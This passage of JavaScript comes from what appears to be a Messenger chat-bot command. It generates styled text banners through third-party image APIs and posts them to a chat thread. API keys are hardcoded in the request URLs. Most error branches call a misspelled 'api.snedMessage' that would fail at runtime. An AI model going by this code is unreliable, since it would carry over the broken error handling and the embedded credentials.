                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/space3d?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "real") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner real | [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/realistic?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
if (text1 == "muty") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner muty | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/multicolor?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "metal") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner metal | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/metaldark?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "dicove") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner dicove | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/discovery?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "engr") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner engr | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/engraved?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "glo") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner glo | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/glossy?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "sumi") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner sumi | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/summer?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }

        if (text1 == "harry") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner harry | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/harry_potter?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "sket") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner sket | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/sketch?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "chorm") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner chorm| [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/3dchrome?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "pape") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner pape| [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/papercut?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         
        if (text1 == "crossfire") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner crossfire | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-ttk.herokuapp.com/banner/crossfire?text=${text2}&apikey=lawerteam`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
    } catch (err) {
        console.log(err)
        return api.sendMessage("Đã xảy ra lỗi", event.threadID);
    }
}
